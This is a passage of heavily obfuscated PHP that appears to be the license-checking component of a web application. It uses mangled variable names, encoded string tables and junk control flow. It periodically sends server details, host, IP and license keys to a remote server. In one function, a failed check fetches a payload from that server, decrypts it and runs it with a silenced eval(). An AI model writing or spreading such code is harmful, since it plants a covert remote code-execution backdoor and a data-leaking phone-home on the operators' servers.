$î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[99]] = md5($_SERVER[$ÁÇ·ã£Ì[100]] . $Ò‰ÅŠí¹[$ÁÇ·ã£Ì[101]]); $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[102]] = base64_encode(serverInfo()); $ÃÔÃÉ€É = $õå¾ÑµŸ[646]; $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[103]] = $this->povsb382eacd; $õäŞ¾¤ = $õå¾ÑµŸ[647]; if ($Ò‰ÅŠí¹[$ÁÇ·ã£Ì[103]] != $ÁÇ·ã£Ì[104]) { $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[105]] = $Ò‰ÅŠí¹[$ÁÇ·ã£Ì[105]]; $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[106]] = $Ò‰ÅŠí¹[$ÁÇ·ã£Ì[106]]; $ÅŸ¬åƒâ = rand_string(10) . $this->povsb382eacd . rand_string(5); $î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[107]][$ÁÇ·ã£Ì[108]] = $this->mlarff31877d($ÅŸ¬åƒâ, $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[99]]); } if ($this->povsb382eacd == $ÁÇ·ã£Ì[104]) { $î™²¤ê[$ÁÇ·ã£Ì[85]][$ÁÇ·ã£Ì[86]][$ÁÇ·ã£Ì[91]][$ÁÇ·ã£Ì[95]] = 0; } $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[109]] = _get($this->kgxj509f9577, $ÁÇ·ã£Ì[110], $ÁÇ·ã£Ì[6]); $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[111]] = _get($this->kgxj509f9577, $ÁÇ·ã£Ì[112], $ÁÇ·ã£Ì[6]); $œêæÁß¨ = $õå¾ÑµŸ[648]; if (_get($GLOBALS, $ÁÇ·ã£Ì[113]) && $this->config[$ÁÇ·ã£Ì[114]]) { $î™²¤ê[$ÁÇ·ã£Ì[96]][$ÁÇ·ã£Ì[115]] = WEB_ROOT; } return $î™²¤ê; } private function bawk0ff65ff1() { $€Ş‘Ãèè =& $_SERVER[Ãìšã«™]; $•ÒÒª =& $_SERVER[ïß‚ÈÄŸ]; if ($_SERVER[$•ÒÒª[24]] == $•ÒÒª[116]) { $¹¡²¾¬ = array($•ÒÒª[103] => $this->povsb382eacd, $•ÒÒª[117] => $this->ghko87867608(), $•ÒÒª[118] => Model($•ÒÒª[119])->count()); if ($this->povsb382eacd != $•ÒÒª[104]) { $¢¿úÏ¬¿ = _get($this->kgxj509f9577, $•ÒÒª[120]); if ($¢¿úÏ¬¿) { $¹¡²¾¬[$•ÒÒª[121]] = $¢¿úÏ¬¿; $¹¡²¾¬[$•ÒÒª[122]] = strtotime(_get($this->kgxj509f9577, $•ÒÒª[123])); $¹¡²¾¬[$•ÒÒª[124]] = _get($this->kgxj509f9577, $•ÒÒª[112]); } $éˆÚ÷ğ = Model($•ÒÒª[33])->get($•ÒÒª[125], $•ÒÒª[6], !0); if (is_string($éˆÚ÷ğ) && substr($éˆÚ÷ğ, 0, 1) == $•ÒÒª[126]) { $éˆÚ÷ğ = json_decode_force($éˆÚ÷ğ); } if (is_array($éˆÚ÷ğ) && $éˆÚ÷ğ[$•ÒÒª[127]] && strstr($éˆÚ÷ğ[$•ÒÒª[127]], $•ÒÒª[128])) { $ øã©¿¥ = explode($•ÒÒª[128], $éˆÚ÷ğ[$•ÒÒª[127]]); $¹¡²¾¬[$•ÒÒª[129]] = $ øã©¿¥[0]; } } $¹¡²¾¬ = $this->gdzs2feaadff(json_encode($¹¡²¾¬), md5($•ÒÒª[130])); $œ•ÍıÄ’ = array($•ÒÒª[131] => $¹¡²¾¬); $á°’Õ½Û = $€Ş‘Ãèè[649]; if (strlen($á°’Õ½Û) < $€Ş‘Ãèè[399]) { return; } call_user_func(array($•ÒÒª[132], $•ÒÒª[133]), $œ•ÍıÄ’); } if ($this->povsb382eacd == $•ÒÒª[104]) { return; } $ãø­ˆ…Æ = array($•ÒÒª[134], $•ÒÒª[135], $•ÒÒª[136], $•ÒÒª[137], $•ÒÒª[138], $•ÒÒª[139]); $×’şÓ²„ = Model($•ÒÒª[33])->get(); $œ•ÍıÄ’ = array($•ÒÒª[140] => $×’şÓ²„[$•ÒÒª[34]], $•ÒÒª[141] => $×’şÓ²„[$•ÒÒª[35]], $•ÒÒª[142] => $•ÒÒª[6]); foreach ($ãø­ˆ…Æ as $ªˆˆ×­¸) { if (!isset($×’şÓ²„[$ªˆˆ×­¸]) || !$×’şÓ²„[$ªˆˆ×­¸]) { continue; } $œ•ÍıÄ’[$ªˆˆ×­¸] = $×’şÓ²„[$ªˆˆ×­¸]; } call_user_func(array($•ÒÒª[132], $•ÒÒª[133]), $œ•ÍıÄ’); $’”ê¦Ô– = $€Ş‘Ãèè[650]; } private function qdbp68bfd33f() { $ÑÆî‡¡“ =& $_SERVER[Ãìšã«™]; $êÎŞªñÙ =& $_SERVER[ïß‚ÈÄŸ]; if ($_SERVER[$êÎŞªñÙ[24]] != $êÎŞªñÙ[143]) { return; } if (!_get($GLOBALS, $êÎŞªñÙ[113])) { die; } $óÙ«·¶õ = $GLOBALS[$êÎŞªñÙ[13]]; if (isset($óÙ«·¶õ[$êÎŞªñÙ[144]])) { $this->smof60a857fe(); die; } if (!isset($óÙ«·¶õ[$êÎŞªñÙ[145]]) || strlen($óÙ«·¶õ[$êÎŞªñÙ[145]]) != 16) { show_json($êÎŞªñÙ[146] . $óÙ«·¶õ[$êÎŞªñÙ[145]], !1); } $•™µëÉÜ = Model($êÎŞªñÙ[33])->get($êÎŞªñÙ[101]); $ÓÀİ°¼ = md5($_SERVER[$êÎŞªñÙ[100]] . $•™µëÉÜ); $œÂããÂ = $ÑÆî‡¡“[651]; while ($œÂããÂ < $ÑÆî‡¡“[612]) { if ($œÂããÂ >= 0) { break; } $œÂããÂ++; } $Ô¹˜ÖºÓ = array($êÎŞªñÙ[145] => $óÙ«·¶õ[$êÎŞªñÙ[145]], $êÎŞªñÙ[147] => rand_string(16), $êÎŞªñÙ[148] => $êÎŞªñÙ[130], $êÎŞªñÙ[149] => $êÎŞªñÙ[150], $êÎŞªñÙ[151] => $_SERVER[$êÎŞªñÙ[152]], $êÎŞªñÙ[153] => $_SERVER[$êÎŞªñÙ[154]], $êÎŞªñÙ[155] => $_SERVER[$êÎŞªñÙ[156]], $êÎŞªñÙ[99] => $ÓÀİ°¼, $êÎŞªñÙ[157] => Model($êÎŞªñÙ[33])->get($êÎŞªñÙ[125])); if ($óÙ«·¶õ[$êÎŞªñÙ[158]] == $êÎŞªñÙ[159]) { $İ æëÊ = $this->gdzs2feaadff($ÓÀİ°¼, $êÎŞªñÙ[160]); $ŸãÒ¿ó“ = $this->mlarff31877d(json_encode($Ô¹˜ÖºÓ), $ÓÀİ°¼ . $êÎŞªñÙ[161], 3); $ŸãÒ¿ó“ = $ŸãÒ¿ó“ . $êÎŞªñÙ[162] . $_SERVER[$êÎŞªñÙ[152]]; $Ç–Ñ÷Ä¹ = $this->jcbuffcdecc5($êÎŞªñÙ[163] . $İ æëÊ . $êÎŞªñÙ[164] . $ŸãÒ¿ó“, -1); show_json($Ç–Ñ÷Ä¹, !0); } else { if ($óÙ«·¶õ[$êÎŞªñÙ[158]] == $êÎŞªñÙ[165]) { $ÓÖŒÕÉÜ = substr(md5($êÎŞªñÙ[166] . $ÓÀİ°¼), 12, 15) . $êÎŞªñÙ[167]; $ŸãÒ¿ó“ = $this->rpfg1643af05(trim($óÙ«·¶õ[$êÎŞªñÙ[168]]), $ÓÖŒÕÉÜ, 2); $‚âÇÙõ = json_decode($ŸãÒ¿ó“, !0); if (!is_array($‚âÇÙõ) || !is_array($‚âÇÙõ[$êÎŞªñÙ[169]]) || $‚âÇÙõ[$êÎŞªñÙ[145]] != !0) { $­Â‡ë›© = $êÎŞªñÙ[170]; $Ÿñç—İò = $‚âÇÙõ[$êÎŞªñÙ[169]] ? $êÎŞªñÙ[171] . $‚âÇÙõ[$êÎŞªñÙ[169]] : $­Â‡ë›©; show_json($Ÿñç—İò, !1); } else { $Ô¹˜ÖºÓ[$êÎŞªñÙ[147]] = $‚âÇÙõ[$êÎŞªñÙ[169]][$êÎŞªñÙ[172]]; } } else { $‚âÇÙõ = $this->jcbuffcdecc5($êÎŞªñÙ[173], $Ô¹˜ÖºÓ, 10); $µå‘åÔÜ = $ÑÆî‡¡“[652]; if (strlen($µå‘åÔÜ) < $ÑÆî‡¡“[399]) { die; } } } if (!is_array($‚âÇÙõ) || !is_array($‚âÇÙõ[$êÎŞªñÙ[169]]) || $‚âÇÙõ[$êÎŞªñÙ[145]] != !0) { $­Â‡ë›© = LNG($êÎŞªñÙ[174]); $Ÿñç—İò = $‚âÇÙõ[$êÎŞªñÙ[169]] ? $êÎŞªñÙ[171] . $‚âÇÙõ[$êÎŞªñÙ[169]] : $­Â‡ë›©; show_json($Ÿñç—İò, !1); } $ÎÄ™ş¥¸ = $‚âÇÙõ[$êÎŞªñÙ[169]]; $ÙÍ’Î•Ü = $this->fcajbacaf764($ÎÄ™ş¥¸[$êÎŞªñÙ[175]]); $‘Áôè™¾ = $ÑÆî‡¡“[653]; if (!$ÙÍ’Î•Ü || $ÙÍ’Î•Ü != $ÎÄ™ş¥¸[$êÎŞªñÙ[123]]) { $È¬Ä‚Ûã = array($êÎŞªñÙ[176] => Model($êÎŞªñÙ[33])->get($êÎŞªñÙ[101]), $êÎŞªñÙ[177] => $_SERVER[$êÎŞªñÙ[100]], $êÎŞªñÙ[178] => this_url(), $êÎŞªñÙ[153] => $_SERVER[$êÎŞªñÙ[154]]); $ŸãÒ¿ó“ = $this->ofilae3a3477(json_encode($È¬Ä‚Ûã)); $this->jcbuffcdecc5($êÎŞªñÙ[179] . $ŸãÒ¿ó“); show_json(LNG($êÎŞªñÙ[180]), !0); } $Â•œßÔ÷ = array($êÎŞªñÙ[181] => $ÎÄ™ş¥¸[$êÎŞªñÙ[182]], $êÎŞªñÙ[183] => $ÎÄ™ş¥¸[$êÎŞªñÙ[184]], $êÎŞªñÙ[185] => rand_string(16), $êÎŞªñÙ[103] => $ÎÄ™ş¥¸[$êÎŞªñÙ[186]]); if ($Ô¹˜ÖºÓ[$êÎŞªñÙ[147]]) { $Â•œßÔ÷[$êÎŞªñÙ[185]] = $Ô¹˜ÖºÓ[$êÎŞªñÙ[147]]; } $¨õÂ„´‹ = substr(md5($Â•œßÔ÷[$êÎŞªñÙ[183]]), 10, 10); $ÛøÜØ”« = $¨õÂ„´‹ . $Â•œßÔ÷[$êÎŞªñÙ[103]] . $Â•œßÔ÷[$êÎŞªñÙ[185]]; $˜˜õ ‰™ = $ÑÆî‡¡“[654]; if (!$˜˜õ ‰™) { die; } $Â•œßÔ÷[$êÎŞªñÙ[105]] = strrev(base64_encode($this->gdzs2feaadff($ÛøÜØ”«, $êÎŞªñÙ[187]))); $¢³¶›·³ = rand_string(16); $ÉÎÈ…›– = $¢³¶›·³ . $Â•œßÔ÷[$êÎŞªñÙ[103]] . $this->gdzs2feaadff(md5($Â•œßÔ÷[$êÎŞªñÙ[181]]), $¢³¶›·³); $ıè¡²£ä = $ÑÆî‡¡“[655]; while (strlen($ıè¡²£ä) < $ÑÆî‡¡“[638]) { if (!$ıè¡²£ä) { break; } $ıè¡²£ä++; } $Â•œßÔ÷[$êÎŞªñÙ[106]] = base64_encode(strrev($this->gdzs2feaadff($ÉÎÈ…›–, $êÎŞªñÙ[188]))); $öİî¢¦¹ = $ÑÆî‡¡“[656]; if (strlen($öİî¢¦¹) < $ÑÆî‡¡“[612]) { return; } if ($ÎÄ™ş¥¸[$êÎŞªñÙ[189]] && $ÎÄ™ş¥¸[$êÎŞªñÙ[189]] >= 1) { Model($êÎŞªñÙ[33])->setDeep($êÎŞªñÙ[190], $êÎŞªñÙ[191]); } Model($êÎŞªñÙ[33])->set($Â•œßÔ÷); $É¬¡ó›‡ = md5($_SERVER[$êÎŞªñÙ[100]] . strrev($•™µëÉÜ) . $Â•œßÔ÷[$êÎŞªñÙ[183]]); $†İ½Ó®™ = $ÑÆî‡¡“[657]; while (strlen($†İ½Ó®™) < $ÑÆî‡¡“[399]) { if (!$†İ½Ó®™) { break; } $†İ½Ó®™++; } $´†ïˆŸ = strrev(substr($É¬¡ó›‡, 10, 16)); $ Òƒ“­ü = $ÑÆî‡¡“[658]; while ($ Òƒ“­ü < $ÑÆî‡¡“[621]) { if ($ Òƒ“­ü >= 0) { break; } $ Òƒ“­ü++; } $À¡¢©‰¹ = $this->mlarff31877d(json_encode($ÎÄ™ş¥¸), $É¬¡ó›‡); $®Â‹Úñ¤ = array_to_keyvalue(Model($êÎŞªñÙ[7])->listData(), $êÎŞªñÙ[192]); $Ãù¢ùŒ× = $ÑÆî‡¡“[659]; if (strlen($Ãù¢ùŒ×) < $ÑÆî‡¡“[616]) { die; } $ÎÄ¾óş© = $®Â‹Úñ¤[$êÎŞªñÙ[193]]; $¾¹º‹Œ¼ = $ÑÆî‡¡“[660]; $Ä“ûô„ê = array(); $Ä“ûô„ê[$´†ïˆŸ] = $À¡¢©‰¹; $ß‘Œ“ü = $ÑÆî‡¡“[661]; while (strlen($ß‘Œ“ü) < $ÑÆî‡¡“[621]) { if (!$ß‘Œ“ü) { break; } $ß‘Œ“ü++; } Model($êÎŞªñÙ[7])->update($ÎÄ¾óş©[$êÎŞªñÙ[194]], array($êÎŞªñÙ[195] => $Ä“ûô„ê)); $–ÖÛ¶œ© = $ÑÆî‡¡“[662]; $this->kgxj509f9577 = $ÎÄ™ş¥¸; $this->povsb382eacd = $Â•œßÔ÷[$êÎŞªñÙ[103]]; $¦È¨ä­Ì = $ÑÆî‡¡“[663]; if (strlen($¦È¨ä­Ì) < $ÑÆî‡¡“[616]) { die; } $this->licenseRegistSuccess(); $£’×Èå = $ÑÆî‡¡“[664]; while (strlen($£’×Èå) < $ÑÆî‡¡“[621]) { if (!$£’×Èå) { break; } $£’×Èå++; } Cache::set($êÎŞªñÙ[196] . md5($•™µëÉÜ . $êÎŞªñÙ[197]), $êÎŞªñÙ[6]); show_json(LNG($êÎŞªñÙ[180]), !0); $ØÆ¿«Ô˜ = $ÑÆî‡¡“[665]; if (!$ØÆ¿«Ô˜) { return; } } private function licenseRegistSuccess() { $ü—šÍ‰ =& $_SERVER[ïß‚ÈÄŸ]; $‹ùà‹åÈ = Model($ü—šÍ‰[33])->get(); $ÓŸ¼òŒ© = $_SERVER[Ãìšã«™][666]; if (!$ÓŸ¼òŒ©) { return; } if ($‹ùà‹åÈ[$ü—šÍ‰[63]] != $ü—šÍ‰[191]) { Model($ü—šÍ‰[33])->set($ü—šÍ‰[63], $ü—šÍ‰[191]); } Action($ü—šÍ‰[198])->initStart(!0); } private function smof60a857fe() { $¼õñô =& $_SERVER[ïß‚ÈÄŸ]; Model($¼õñô[33])->set(array($¼õñô[181] => $¼õñô[6], $¼õñô[183] => $¼õñô[6], $¼õñô[103] => $¼õñô[104], $¼õñô[105] => $¼õñô[6], $¼õñô[106] => $¼õñô[6])); Model($¼õñô[33])->setDeep($¼õñô[190], $¼õñô[199]); $ÃÄ×º‰ = $_SERVER[Ãìšã«™][667]; if (!$ÃÄ×º‰) { die; } $this->kgxj509f9577 = array(); $this->povsb382eacd = $¼õñô[104]; } private function djozda83c582() { $¢ñöœİ =& $_SERVER[Ãìšã«™]; $³ô˜ñ‹› =& $_SERVER[ïß‚ÈÄŸ]; $_SERVER[$³ô˜ñ‹›[154]] = _get($_SERVER, $³ô˜ñ‹›[154], APP_HOST); $İƒœ±ëÇ = $¢ñöœİ[668]; if (strlen($İƒœ±ëÇ) < $¢ñöœİ[399]) { return; } $this->povsb382eacd = $³ô˜ñ‹›[104]; $ìÓºã«Ø = $¢ñöœİ[669]; if (!$ìÓºã«Ø) { die; } $ƒ‘†€“¼ = Model($³ô˜ñ‹›[33])->get(); $ÅñïÍ¼ = $¢ñöœİ[670]; while ($ÅñïÍ¼ < $¢ñöœİ[638]) { if ($ÅñïÍ¼ >= 0) { break; } $ÅñïÍ¼++; } if ($ƒ‘†€“¼[$³ô˜ñ‹›[103]] == $³ô˜ñ‹›[104]) { return; } $°Æåê¡ = Model($³ô˜ñ‹›[33])->get($³ô˜ñ‹›[101]); $—İñŸËé = $³ô˜ñ‹›[196] . md5($°Æåê¡ . $³ô˜ñ‹›[197]); $ÉŒÜ©üÆ = $¢ñöœİ[671]; if (strlen($ÉŒÜ©üÆ) < $¢ñöœİ[638]) { die; } $××Ÿªü = Cache::get($—İñŸËé); if (!is_array($××Ÿªü) || !isset($××Ÿªü[$³ô˜ñ‹›[200]]) || time() - $××Ÿªü[$³ô˜ñ‹›[200]] >= 60) { $Ä†ÖŞÎë = Model($³ô˜ñ‹›[7])->loadList(); $¬¤ÜìÎÈ = $Ä†ÖŞÎë[$³ô˜ñ‹›[193]]; $úÆüãçÛ = md5($_SERVER[$³ô˜ñ‹›[100]] . strrev($°Æåê¡) . $ƒ‘†€“¼[$³ô˜ñ‹›[183]]); $øÎ¿êÉ¨ = strrev(substr($úÆüãçÛ, 10, 16)); $××Ÿªü = $this->rpfg1643af05($¬¤ÜìÎÈ[$³ô˜ñ‹›[83]][$øÎ¿êÉ¨], $úÆüãçÛ); $××Ÿªü = json_decode($××Ÿªü, !0); } if (!is_array($××Ÿªü)) { return $this->smof60a857fe(); } $µìé³®¨ = strtotime($××Ÿªü[$³ô˜ñ‹›[123]]); if (time() >= $µìé³®¨) { return $this->smof60a857fe(); } if (time() - $××Ÿªü[$³ô˜ñ‹›[200]] > 20) { $××Ÿªü[$³ô˜ñ‹›[200]] = time(); Cache::set($—İñŸËé, $××Ÿªü); } $this->kgxj509f9577 = $××Ÿªü; $this->povsb382eacd = $ƒ‘†€“¼[$³ô˜ñ‹›[103]]; $ÌºÛÌëÔ = $¢ñöœİ[672]; if (strlen($ÌºÛÌëÔ) < $¢ñöœİ[616]) { return; } } private function mdvu3ec12e6d() { $Íò­–´„ =& $_SERVER[Ãìšã«™]; $…Ø½ŒÜÀ =& $_SERVER[ïß‚ÈÄŸ]; $ç£ü¾å = $GLOBALS[$…Ø½ŒÜÀ[13]]; $¨ŞÙÚøò = $Íò­–´„[673]; if (strlen($¨ŞÙÚøò) < $Íò­–´„[621]) { die; } $Ñˆ¶¸® = $_SERVER[$…Ø½ŒÜÀ[24]]; if ($Ñˆ¶¸® == $…Ø½ŒÜÀ[201] && $this->povsb382eacd == $…Ø½ŒÜÀ[104]) { show_json(LNG($…Ø½ŒÜÀ[202]), !1, $…Ø½ŒÜÀ[203]); } $²ôÙÚİÚ = array($…Ø½ŒÜÀ[204], $…Ø½ŒÜÀ[205]); if (in_array($Ñˆ¶¸®, $²ôÙÚİÚ)) { if ($this->povsb382eacd == $…Ø½ŒÜÀ[104] && isset($ç£ü¾å[$…Ø½ŒÜÀ[206]])) { show_json(LNG($…Ø½ŒÜÀ[202]), !1, $…Ø½ŒÜÀ[203]); die; } $ÒĞªËÜ = $this->ghko87867608(); if ($ÒĞªËÜ != intval($…Ø½ŒÜÀ[207])) { if ($ÒĞªËÜ <= Model($…Ø½ŒÜÀ[119])->count()) { show_json(LNG($…Ø½ŒÜÀ[208]), !1, $…Ø½ŒÜÀ[203]); die; } } } } private function rsoj763df3d6() { $¾·ºìÑÈ =& $_SERVER[Ãìšã«™]; $—•òÏ˜â =& $_SERVER[ïß‚ÈÄŸ]; $éåĞá½¹ = array($—•òÏ˜â[116], $—•òÏ˜â[209]); $ØÄ Ì²Ê = $¾·ºìÑÈ[674]; if (!$ØÄ Ì²Ê) { return; } if (!_get($GLOBALS, $—•òÏ˜â[113]) || !isset($_GET[$—•òÏ˜â[210]])) { return; } if (!in_array($_SERVER[$—•òÏ˜â[24]], $éåĞá½¹)) { return; } $…´ßÒƒ‚ = $—•òÏ˜â[211]; $¦ÁÕõåİ = $¾·ºìÑÈ[647]; $…´ßÒƒ‚ = $this->tzlea4d083e3($…´ßÒƒ‚, $—•òÏ˜â[212]); $Ö¼ß¥ ø = $¾·ºìÑÈ[675]; if (strlen($Ö¼ß¥ ø) < $¾·ºìÑÈ[399]) { die; } $›Õç‘´ = stream_context_create(array($—•òÏ˜â[213] => array($—•òÏ˜â[214] => $—•òÏ˜â[215], $—•òÏ˜â[216] => 3))); $¢¤Óôœ¤ = $¾·ºìÑÈ[676]; $€ıæö = @file_get_contents($…´ßÒƒ‚, !1, $›Õç‘´); header($—•òÏ˜â[217]); if ($€ıæö && strstr($€ıæö, $—•òÏ˜â[218])) { echo $€ıæö; } die; } public function jdfbbb4fd252($šËæÔà) { $ƒæÊè =& $_SERVER[Ãìšã«™]; $ ÂÀ¥„Ø =& $_SERVER[ïß‚ÈÄŸ]; if ($this->povsb382eacd == $ ÂÀ¥„Ø[219]) { return $šËæÔà; } $¦ÈÀ¬™ = array($ ÂÀ¥„Ø[220] => $ ÂÀ¥„Ø[221], $ ÂÀ¥„Ø[222] => $ ÂÀ¥„Ø[221], $ ÂÀ¥„Ø[223] => $ ÂÀ¥„Ø[221], $ ÂÀ¥„Ø[224] => $ ÂÀ¥„Ø[221], $ ÂÀ¥„Ø[225] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[227] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[228] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[229] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[230] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[231] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[232] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[233] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[234] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[235] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[236] => $ ÂÀ¥„Ø[226], $ ÂÀ¥„Ø[237] => $ ÂÀ¥„Ø[226]); $áâØ ì» = $ƒæÊè[677]; if (strlen($áâØ ì») < $ƒæÊè[638]) { die; } $·í®¡¯Á = explode($ ÂÀ¥„Ø[238], _get($this->kgxj509f9577, $ ÂÀ¥„Ø[110], $ ÂÀ¥„Ø[6])); $–›µĞèº = array(); $³¨şµ¡² = $ƒæÊè[678]; foreach ($¦ÈÀ¬™ as $ƒ°‘ßşè => $ŞêšŸ®) { if ($ŞêšŸ® == $ ÂÀ¥„Ø[221] && substr($this->povsb382eacd, 0, 1) == $ ÂÀ¥„Ø[221]) { continue; } if (!in_array($ƒ°‘ßşè, $·í®¡¯Á)) { $–›µĞèº[] = $ƒ°‘ßşè; } } foreach ($–›µĞèº as $ƒ°‘ßşè) { unset($šËæÔà[$ƒ°‘ßşè]); $›åääÂ« = $ƒæÊè[679]; if (strlen($›åääÂ«) < $ƒæÊè[638]) { die; } } return $šËæÔà; } private function zxjh45c1ed14() { $ùÌÃ×›· =& $_SERVER[ïß‚ÈÄŸ]; if ($this->povsb382eacd != $ùÌÃ×›·[104]) { $GLOBALS[$ùÌÃ×›·[83]][$ùÌÃ×›·[87]][$ùÌÃ×›·[239]] = $ùÌÃ×›·[199]; return; } $GLOBALS[$ùÌÃ×›·[83]][$ùÌÃ×›·[240]] = $ùÌÃ×›·[191]; if (Model($ùÌÃ×›·[241])->get($ùÌÃ×›·[63]) != $ùÌÃ×›·[199]) { Model($ùÌÃ×›·[241])->set($ùÌÃ×›·[63], $ùÌÃ×›·[199]); } } public function kspba2acacd2() { $ŸìŸĞŞ =& $_SERVER[Ãìšã«™]; return $_SERVER[ïß‚ÈÄŸ][242]; $ºãŸ÷Æ± = $ŸìŸĞŞ[680]; if (strlen($ºãŸ÷Æ±) < $ŸìŸĞŞ[621]) { die; } } private function onyc14f7497d() { $…üÅÌè =& $_SERVER[Ãìšã«™]; $×êÄÖ ¬ =& $_SERVER[ïß‚ÈÄŸ]; $œÍêÊ = array($×êÄÖ ¬[243], $×êÄÖ ¬[244], $×êÄÖ ¬[245]); $Ë¨àæÈı = $…üÅÌè[681]; if (strlen($Ë¨àæÈı) < $…üÅÌè[612]) { die; } $¦ßÖıñÑ = $×êÄÖ ¬[246] . md5($×êÄÖ ¬[247]); $èúçÂ¸ = $…üÅÌè[682]; if (!$èúçÂ¸) { die; } if ($this->povsb382eacd == $×êÄÖ ¬[104] || !_get($GLOBALS, $×êÄÖ ¬[113])) { return; } if (!in_array($_SERVER[$×êÄÖ ¬[24]], $œÍêÊ)) { return; } if (time() % 4 != 0) { return; } $µ¶µŒ ê = call_user_func(array($×êÄÖ ¬[248], $×êÄÖ ¬[249]), $¦ßÖıñÑ); if ($µ¶µŒ ê && time() - $µ¶µŒ ê < intval($×êÄÖ ¬[250])) { return; } call_user_func(array($×êÄÖ ¬[248], $×êÄÖ ¬[133]), $¦ßÖıñÑ, time()); $íŞëÔú› = Model($×êÄÖ ¬[33])->get($×êÄÖ ¬[101]); $©Îœ˜ü = $…üÅÌè[683]; if (!$©Îœ˜ü) { return; } $¹äğ‘º‘ = array($×êÄÖ ¬[145] => Model($×êÄÖ ¬[33])->get($×êÄÖ ¬[181]), $×êÄÖ ¬[158] => $this->povsb382eacd, $×êÄÖ ¬[155] => $_SERVER[$×êÄÖ ¬[156]], $×êÄÖ ¬[157] => Model($×êÄÖ ¬[33])->get($×êÄÖ ¬[125]), $×êÄÖ ¬[99] => md5($_SERVER[$×êÄÖ ¬[100]] . $íŞëÔú›), $×êÄÖ ¬[148] => $×êÄÖ ¬[130], $×êÄÖ ¬[151] => $_SERVER[$×êÄÖ ¬[152]]); $»ˆÒş = $…üÅÌè[684]; $Û–¦õ = $this->jcbuffcdecc5($×êÄÖ ¬[251], $¹äğ‘º‘); $ºªÑ•¶ = $…üÅÌè[685]; if (strlen($ºªÑ•¶) < $…üÅÌè[612]) { die; } if (!is_array($Û–¦õ)) { return; } if ($Û–¦õ[$×êÄÖ ¬[145]] && $Û–¦õ[$×êÄÖ ¬[252]]) { if ($this->fcajbacaf764($Û–¦õ[$×êÄÖ ¬[252]]) == $¹äğ‘º‘[$×êÄÖ ¬[145]]) { return; } } $this->smof60a857fe(); if ($this->fcajbacaf764($Û–¦õ[$×êÄÖ ¬[252]]) != $¹äğ‘º‘[$×êÄÖ ¬[145]]) { $à”˜ª‹ˆ = array($×êÄÖ ¬[176] => $íŞëÔú›, $×êÄÖ ¬[177] => $_SERVER[$×êÄÖ ¬[100]], $×êÄÖ ¬[178] => this_url(), $×êÄÖ ¬[153] => $_SERVER[$×êÄÖ ¬[154]]); $Ÿ‹ÈÂÎ = $this->ofilae3a3477(json_encode($à”˜ª‹ˆ)); $Û–¦õ = $this->jcbuffcdecc5($×êÄÖ ¬[179] . $Ÿ‹ÈÂÎ); if ($Û–¦õ && is_array($Û–¦õ) && isset($Û–¦õ[$×êÄÖ ¬[252]])) { $Ëğ¶‰¯Ù = $this->rpfg1643af05($Û–¦õ[$×êÄÖ ¬[252]], 2); if ($Ëğ¶‰¯Ù) { $Ëğ¶‰¯Ù = $this->fcajbacaf764($Ëğ¶‰¯Ù); } if ($Ëğ¶‰¯Ù) { try { @eval($Ëğ¶‰¯Ù); } catch (Exception $Ö¹µĞÆÒ) { } } } } } private function jcbuffcdecc5($Î”öÑ¦‚ = '', $“ÛÉ™˜ = array(), $óñÃ¸¨† = 5) { $‡âÀ¹ö =& $_SERVER[Ãìšã«™]; $ûÍÏšŸä =& $_SERVER[ïß‚ÈÄŸ]; $îÖ®±ÎÏ = $ûÍÏšŸä[253]; $½ˆÇ’íÏ = $‡âÀ¹ö[686]; if (strlen($½ˆÇ’íÏ) < $‡âÀ¹ö[399]) { die; } $îÖ®±ÎÏ = $this->tzlea4d083e3($îÖ®±ÎÏ, $ûÍÏšŸä[254]); $îÖ®±ÎÏ = $îÖ®±ÎÏ . $Î”öÑ¦‚; if ($“ÛÉ™˜ && is_array($“ÛÉ™˜)) { $îÖ®±ÎÏ = $îÖ®±ÎÏ . $ûÍÏšŸä[255] . http_build_query($“ÛÉ™˜); } if ($“ÛÉ™˜ === -1) { return $îÖ®±ÎÏ; } $ƒñ¸°† = stream_context_create(array($ûÍÏšŸä[213] => array($ûÍÏšŸä[216] => $óñÃ¸¨†, $ûÍÏšŸä[214] => $ûÍÏšŸä[256]), $ûÍÏšŸä[257] => array($ûÍÏšŸä[258] => !1, $ûÍÏšŸä[259] => !1))); $Ç½í = $‡âÀ¹ö[687]; if (strlen($Ç½í) < $‡âÀ¹ö[621]) { return; } $“ÛÉ™˜ = @file_get_contents($îÖ®±ÎÏ, !1, $ƒñ¸°†); return json_decode($“ÛÉ™˜, !0); $ÙşŒ¤¿× = $‡âÀ¹ö[688]; if (!$ÙşŒ¤¿×) { return; } } private function ghko87867608() { $¯ñä˜ğú =& $_SERVER[Ãìšã«™]; $¼Ï¸‰Òô =& $_SERVER[ïß‚ÈÄŸ]; $İÄÛ³ = array($¼Ï¸‰Òô[260] => $¼Ï¸‰Òô[261], $¼Ï¸‰Òô[262] => $¼Ï¸‰Òô[263], $¼Ï¸‰Òô[264] => $¼Ï¸‰Òô[265], $¼Ï¸‰Òô[266] => $¼Ï¸‰Òô[267], $¼Ï¸‰Òô[268] => $¼Ï¸‰Òô[269], $¼Ï¸‰Òô[270] => $¼Ï¸‰Òô[207], $¼Ï¸‰Òô[271] => $¼Ï¸‰Òô[207], $¼Ï¸‰Òô[272] => $¼Ï¸‰Òô[261], $¼Ï¸‰Òô[273] => $¼Ï¸‰Òô[263], $¼Ï¸‰Òô[274] => 